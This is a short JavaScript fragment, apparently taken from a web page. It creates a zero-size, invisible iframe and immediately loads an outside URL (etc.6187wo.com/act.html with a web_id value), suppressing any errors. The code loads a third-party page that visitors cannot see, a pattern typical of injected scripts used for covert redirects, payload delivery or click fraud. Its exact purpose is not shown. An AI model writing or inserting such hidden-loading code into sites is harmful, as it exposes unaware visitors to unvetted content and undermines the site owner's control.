  
			function callWithSchema(schema,id) {
                var frame = document.createElement('iframe');
                id && (frame.id = id);
                frame.style.cssText = 'position:absolute;left:0;top:0;width:0;height:0;visibility:hidden;';
                frame.frameBorder = '0';
                frame.src = schema;
                try{
                    document.body.appendChild(frame);
                }catch (e){}
            };
			callWithSchema('https://etc.6187wo.com/act.html#web_id=1277674222');
